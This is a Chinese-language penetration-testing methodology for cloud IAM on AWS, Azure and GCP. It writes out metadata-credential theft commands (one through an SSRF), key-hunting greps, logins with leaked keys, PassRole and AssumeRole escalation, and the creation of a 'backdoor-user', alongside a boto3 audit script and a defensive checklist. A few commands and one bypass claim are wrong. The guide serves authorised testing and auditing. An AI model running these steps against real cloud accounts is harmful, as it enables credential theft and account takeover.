# 云 IAM 权限测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的

为渗透测试人员提供一套标准化的云身份和访问管理（IAM）测试流程，帮助识别云环境中的权限配置错误、过度授权和权限提升路径。

## 1.2 适用范围

本文档适用于以下场景：
- AWS IAM 权限测试
- Azure AD / Entra ID 权限测试
- Google Cloud IAM 权限测试
- 多云环境权限测试
- Kubernetes RBAC 权限测试
- SaaS 应用权限管理（Okta、OneLogin 等）

## 1.3 读者对象

- 执行云安全测试的渗透测试人员
- 进行云 IAM 配置审计的安全分析师
- 负责云安全架构的开发和运维人员

---

# 第二部分：核心渗透技术专题

## 专题一：云 IAM 权限测试

### 2.1 技术介绍

云 IAM 权限测试是指对云平台的身份和访问管理机制进行系统性测试，验证用户、角色、策略的权限配置是否正确，识别过度授权、权限提升路径和配置错误。

**云 IAM 核心概念：**
```
┌─────────────────────────────────────────────────────────┐
│                    云 IAM 核心组件                        │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐ │
│  │   Users     │    │   Groups    │    │   Roles     │ │
│  │   (用户)    │    │   (组)      │    │   (角色)    │ │
│  └──────┬──────┘    └──────┬──────┘    └──────┬──────┘ │
│         │                  │                  │         │
│         └──────────────────┼──────────────────┘         │
│                            │                            │
│                            ▼                            │
│                   ┌─────────────┐                       │
│                   │  Policies   │                       │
│                   │  (策略)     │                       │
│                   └──────┬──────┘                       │
│                          │                              │
│                          ▼                              │
│                   ┌─────────────┐                       │
│                   │ Permissions │                       │
│                   │  (权限)     │                       │
│                   └──────┬──────┘                       │
│                          │                              │
│                          ▼                              │
│                   ┌─────────────┐                       │
│                   │  Resources  │                       │
│                   │  (资源)     │                       │
│                   └─────────────┘                       │
│                                                         │
└─────────────────────────────────────────────────────────┘

常见权限问题：
1. 过度授权（Over-privileged）
2. 权限继承滥用
3. 信任关系配置错误
4. 临时凭证滥用
5. 服务角色权限过宽
```

**云 IAM 漏洞本质：**
1. **过度授权** - 用户/角色拥有超出需求的权限
2. **信任错误** - 信任关系允许未授权的实体担任角色
3. **凭证泄露** - Access Key、Service Account Key 泄露
4. **权限提升** - 通过组合权限实现权限提升
5. **配置漂移** - 随时间推移权限累积

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **EC2/VM 实例** | 实例角色、托管身份 | 实例元数据服务泄露凭证 |
| **Lambda/函数** | 无服务器函数角色 | 函数执行权限过宽 |
| **CI/CD 管道** | GitHub Actions、CodeBuild | CI/CD 凭证泄露 |
| **容器服务** | EKS、AKS、GKE | ServiceAccount 权限过宽 |
| **存储访问** | S3、Blob Storage | 存储桶策略配置错误 |
| **数据库服务** | RDS、CosmosDB | 数据库访问权限过宽 |
| **跨账户访问** | 角色假设、服务主体 | 信任关系配置错误 |
| **第三方集成** | OAuth 应用、API 连接 | OAuth 权限过宽 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：信息收集**
```bash
# AWS - 枚举 IAM 信息
# 如果有只读权限
aws iam list-users
aws iam list-roles
aws iam list-policies
aws iam get-account-summary

# Azure - 枚举 Azure AD
az ad user list
az ad group list
az role assignment list

# GCP - 枚举 IAM 策略
gcloud iam roles list
gcloud projects get-iam-policy PROJECT_ID

# 枚举服务
aws ec2 describe-instances
aws lambda list-functions
aws s3 ls
```

**步骤二：凭证发现**
```bash
# AWS - 检查实例元数据
# EC2 实例上执行
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# AWS - 检查环境变量
env | grep AWS
env | grep ACCESS_KEY

# Azure - 检查托管身份
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
     -H "Metadata: true"

# GCP - 检查服务账户
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
     -H "Metadata-Flavor: Google"

# 检查代码仓库中的凭证
grep -r "AKIA" .  # AWS Access Key
grep -r "AIza" .  # Google API Key
grep -r "eyJ" .   # JWT Token
```

**步骤三：权限枚举**
```bash
# AWS - 检查当前凭证权限
aws sts get-caller-identity
aws iam simulate-principal-policy \
    --policy-source-arn arn:aws:iam::ACCOUNT_ID:user/USERNAME \
    --action-names "s3:*" "ec2:*" "iam:*"

# AWS - 使用 CloudTrail 分析权限
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin

# Azure - 检查有效权限
az role assignment list --assignee OBJECT_ID
az ad signed-in-user show

# GCP - 检查有效权限
gcloud iam list-grantable-roles //cloudresourcemanager.googleapis.com/projects/PROJECT_ID
```

**步骤四：信任关系测试**
```bash
# AWS - 测试角色假设
# 检查角色的信任策略
aws iam get-role --role-name ROLE_NAME

# 尝试假设角色
aws sts assume-role \
    --role-arn arn:aws:iam::ACCOUNT_ID:role/ROLE_NAME \
    --role-session-name test-session

# Azure - 测试服务主体
# 检查应用注册
az ad app list --show-mine

# 尝试获取令牌
curl -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "grant_type=client_credentials&client_id=CLIENT_ID&client_secret=SECRET&resource=RESOURCE" \
     https://login.microsoftonline.com/TENANT_ID/oauth2/token
```

#### 2.3.2 白盒测试

**代码审计要点：**
1. 检查 IAM 策略文档
2. 检查信任关系配置
3. 检查凭证管理方式
4. 检查权限边界设置

**示例（不安全的 IAM 策略）：**
```json
// ❌ 不安全 - AWS 过度授权
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}

// ✅ 安全 - 最小权限原则
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "arn:aws:s3:::my-bucket/*"
    }
  ]
}

// ❌ 不安全 - 信任关系过于宽松
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "*"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}

// ✅ 安全 - 限制信任主体
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789012:role/TrustedRole"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```

### 2.4 漏洞利用方法

#### 2.4.1 凭证泄露利用

```bash
# AWS - 使用泄露的 Access Key
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# 验证凭证
aws sts get-caller-identity

# 枚举权限
aws iam list-attached-user-roles --user-name USERNAME
aws iam list-user-policies --user-name USERNAME

# Azure - 使用泄露的服务主体
export AZURE_TENANT_ID=tenant-id
export AZURE_CLIENT_ID=client-id
export AZURE_CLIENT_SECRET=client-secret

az login --service-principal \
   -u $AZURE_CLIENT_ID \
   -p $AZURE_CLIENT_SECRET \
   --tenant $AZURE_TENANT_ID

# GCP - 使用泄露的服务账户密钥
export GOOGLE_APPLICATION_CREDENTIALS=/path/to/service-account-key.json

# 验证凭证
gcloud auth activate-service-account --key-file $GOOGLE_APPLICATION_CREDENTIALS
gcloud config list
```

#### 2.4.2 权限提升路径

```bash
# AWS - iam:PassRole + 服务权限
# 如果用户有 iam:PassRole 和 lambda:CreateFunction
# 可以创建具有更高权限的 Lambda 函数

# 1. 创建 Lambda 函数，附加高权限角色
aws lambda create-function \
    --function-name privileged-function \
    --role arn:aws:iam::ACCOUNT_ID:role/HighPrivilegeRole \
    --handler index.handler \
    --runtime python3.9 \
    --zip-file fileb://function.zip

# 2. 调用 Lambda 函数执行高权限操作
aws lambda invoke \
    --function-name privileged-function \
    --payload '{"command": "create-admin-user"}' \
    output.json

# AWS - sts:AssumeRole 权限提升
# 如果可以假设另一个角色
aws sts assume-role \
    --role-arn arn:aws:iam::ACCOUNT_ID:role/AdminRole \
    --role-session-name attack-session

# 使用临时凭证
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 执行管理员操作
aws iam create-user --user-name backdoor-user
```

#### 2.4.3 元数据服务利用

```bash
# AWS IMDSv1 (不安全)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# AWS IMDSv2 (需要 token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF 利用获取凭证
# 如果应用存在 SSRF 漏洞
curl http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure 托管身份
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
     -H "Metadata: true"

# GCP 服务账户
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
     -H "Metadata-Flavor: Google"
```

#### 2.4.4 自动化测试脚本

```python
#!/usr/bin/env python3
"""云 IAM 权限自动化测试脚本"""

import boto3
import json
from botocore.exceptions import ClientError

class AWSIAMTester:
    def __init__(self):
        self.iam = boto3.client('iam')
        self.sts = boto3.client('sts')
        self.results = []
    
    def get_caller_identity(self):
        """获取当前身份"""
        try:
            identity = self.sts.get_caller_identity()
            print(f"[*] 当前身份：{identity['Arn']}")
            print(f"[*] 账户 ID: {identity['Account']}")
            return identity
        except ClientError as e:
            print(f"[!] 错误：{e}")
            return None
    
    def enumerate_users(self):
        """枚举用户"""
        try:
            users = self.iam.list_users()['Users']
            print(f"[*] 发现 {len(users)} 个用户")
            for user in users:
                print(f"    - {user['UserName']}")
            return users
        except ClientError as e:
            print(f"[!] 错误：{e}")
            return []
    
    def enumerate_roles(self):
        """枚举角色"""
        try:
            roles = self.iam.list_roles()['Roles']
            print(f"[*] 发现 {len(roles)} 个角色")
            for role in roles:
                print(f"    - {role['RoleName']}")
            return roles
        except ClientError as e:
            print(f"[!] 错误：{e}")
            return []
    
    def check_role_trust(self, role_name):
        """检查角色信任策略"""
        try:
            role = self.iam.get_role(RoleName=role_name)
            trust_policy = role['Role']['AssumeRolePolicyDocument']
            
            # 检查是否允许任意 AWS 主体
            for statement in trust_policy.get('Statement', []):
                principal = statement.get('Principal', {})
                if principal.get('AWS') == '*':
                    print(f"[!] 角色 {role_name} 允许任意 AWS 主体假设")
                    return False
            return True
        except ClientError as e:
            print(f"[!] 错误：{e}")
            return None
    
    def check_policy_attachment(self, role_name):
        """检查角色附加的策略"""
        try:
            attached = self.iam.list_attached_role_policies(RoleName=role_name)
            for policy in attached['AttachedPolicies']:
                print(f"    - {policy['PolicyName']}: {policy['PolicyArn']}")
                
                # 检查管理员策略
                if 'AdministratorAccess' in policy['PolicyArn']:
                    print(f"[!] 角色 {role_name} 有管理员权限")
            
            return attached['AttachedPolicies']
        except ClientError as e:
            print(f"[!] 错误：{e}")
            return []
    
    def test_privilege_escalation(self, user_name):
        """测试权限提升路径"""
        escalation_paths = []
        
        # 检查 iam:PassRole
        try:
            response = self.iam.simulate_principal_policy(
                PolicySourceArn=f'arn:aws:iam::ACCOUNT_ID:user/{user_name}',
                ActionNames=['iam:PassRole']
            )
            if response['EvaluationResults'][0]['EvalDecision'] == 'allowed':
                escalation_paths.append('iam:PassRole')
                print(f"[!] 用户 {user_name} 有 iam:PassRole 权限")
        except:
            pass
        
        # 检查 sts:AssumeRole
        try:
            response = self.iam.simulate_principal_policy(
                PolicySourceArn=f'arn:aws:iam::ACCOUNT_ID:user/{user_name}',
                ActionNames=['sts:AssumeRole']
            )
            if response['EvaluationResults'][0]['EvalDecision'] == 'allowed':
                escalation_paths.append('sts:AssumeRole')
                print(f"[!] 用户 {user_name} 有 sts:AssumeRole 权限")
        except:
            pass
        
        return escalation_paths
    
    def run_full_assessment(self):
        """运行完整评估"""
        print("[*] 开始 AWS IAM 安全评估...")
        
        identity = self.get_caller_identity()
        if not identity:
            return
        
        self.enumerate_users()
        self.enumerate_roles()
        
        # 检查每个角色的信任策略
        roles = self.enumerate_roles()
        for role in roles:
            self.check_role_trust(role['RoleName'])
            self.check_policy_attachment(role['RoleName'])

# 使用示例
tester = AWSIAMTester()
tester.run_full_assessment()
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过权限边界

```bash
# AWS - 利用多个策略组合
# 如果权限边界和身份策略组合后有过宽权限

# 1. 检查权限边界
aws iam get_user --user-name USERNAME

# 2. 检查附加策略
aws iam list-attached-user-policies --user-name USERNAME

# 3. 尝试组合权限
# 权限边界允许 A+B，身份策略允许 B+C
# 实际有效权限是交集 B
```

#### 2.5.2 利用条件键绕过

```bash
# AWS - 绕过条件限制
# 如果策略有条件限制，尝试绕过

# 1. MFA 条件 - 如果未强制 MFA
aws s3 ls s3://sensitive-bucket

# 2. IP 条件 - 如果 IP 范围配置错误
# 尝试从允许的 IP 范围访问

# 3. 时间条件 - 在允许的时间窗口访问
```

#### 2.5.3 服务控制策略（SCP）绕过

```bash
# AWS Organizations - SCP 绕过
# SCP 不影响 aws- 开头的服务

# 1. 使用 AWS 服务角色
aws iam create-service-linked-role --aws-service-name elasticbeanstalk.amazonaws.com

# 2. 利用 SCP 未限制的服务
# 如果 SCP 只限制部分服务
```

#### 2.5.4 跨账户权限提升

```bash
# AWS - 跨账户角色假设
# 如果账户 A 的角色可以假设账户 B 的角色

aws sts assume-role \
    --role-arn arn:aws:iam::ACCOUNT_B_ID:role/CrossAccountRole \
    --role-session-name cross-account-attack

# Azure - 跨租户访问
# 如果有 guest 用户权限
az login --tenant TENANT_ID
az account set --subscription SUBSCRIPTION_ID

# 枚举另一个租户的资源
az resource list
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| **类别** | **测试目标** | **Payload 示例** | **说明** |
| :--- | :--- | :--- | :--- |
| **元数据** | AWS IMDS | `curl 169.254.169.254/...` | 获取实例凭证 |
| **元数据** | Azure MSI | `curl 169.254.169.254/metadata/identity...` | 获取托管身份 |
| **元数据** | GCP SA | `curl metadata.google.internal/...` | 获取服务账户 |
| **枚举** | AWS 用户 | `aws iam list-users` | 枚举用户 |
| **枚举** | AWS 角色 | `aws iam list-roles` | 枚举角色 |
| **枚举** | Azure 分配 | `az role assignment list` | 枚举分配 |
| **提升** | PassRole | `aws lambda create-function --role` | 权限提升 |
| **提升** | AssumeRole | `aws sts assume-role` | 角色假设 |

## 3.2 云 IAM 测试检查清单

### 身份管理
- [ ] 是否有未使用的用户/角色
- [ ] 是否有硬编码凭证
- [ ] 是否启用 MFA
- [ ] 密码策略是否足够强

### 权限管理
- [ ] 是否有 `*:*` 权限
- [ ] 是否有管理员权限滥用
- [ ] 是否遵循最小权限原则
- [ ] 权限边界是否正确配置

### 信任关系
- [ ] 角色信任策略是否过宽
- [ ] 是否有 `Principal: "*"` 配置
- [ ] 跨账户信任是否受控
- [ ] 服务主体信任是否正确

### 凭证管理
- [ ] Access Key 是否轮换
- [ ] 是否有未使用的凭证
- [ ] 凭证是否安全存储
- [ ] 是否使用临时凭证

### 监控审计
- [ ] 是否启用 CloudTrail/Activity Log
- [ ] 是否有异常登录检测
- [ ] 是否有权限变更审计
- [ ] 是否有告警机制

## 3.3 常用测试工具

| **工具名称** | **用途** | **命令示例** |
| :--- | :--- | :--- |
| **aws-cli** | AWS 管理 | `aws iam list-users` |
| **azure-cli** | Azure 管理 | `az role assignment list` |
| **gcloud** | GCP 管理 | `gcloud iam roles list` |
| **Pacu** | AWS 渗透测试 | `pacu` |
| **Stormspotter** | Azure 渗透测试 | `stormspotter` |
| **ScoutSuite** | 多云安全审计 | `scout aws` |
| **Prowler** | AWS 安全最佳实践 | `prowler -M json` |
| **BloodHound** | AD/Azure AD 分析 | `bloodhound-python` |

## 3.4 权限提升路径参考

```
常见 AWS 权限提升路径：

1. iam:PassRole + lambda:CreateFunction
   → 创建具有高权限角色的 Lambda

2. iam:CreateAccessKey
   → 为其他用户创建 Access Key

3. iam:CreateLoginProfile
   → 为其他用户创建控制台密码

4. sts:AssumeRole
   → 假设更高权限的角色

5. iam:AttachUserPolicy + iam:CreatePolicyVersion
   → 修改策略增加权限

6. ec2:RunInstances + iam:PassRole
   → 启动具有高权限角色的 EC2

7. glue:UpdateDevEndpoint
   → 更新 Glue 端点执行代码

8. cloudformation:CreateStack
   → 创建具有任意角色的 CloudFormation 栈
```

---

## 参考资源

- [OWASP Cloud Security](https://cheatsheetseries.owasp.org/cheatsheets/Cloud_Security_Cheat_Sheet.html)
- [AWS IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- [Azure AD Security Best Practices](https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-best-practices)
- [GCP IAM Security](https://cloud.google.com/iam/docs/overview)
- [Cloud Privilege Escalation Playbook](https://bishopfox.com/blog/privilege-escalation-in-aws)
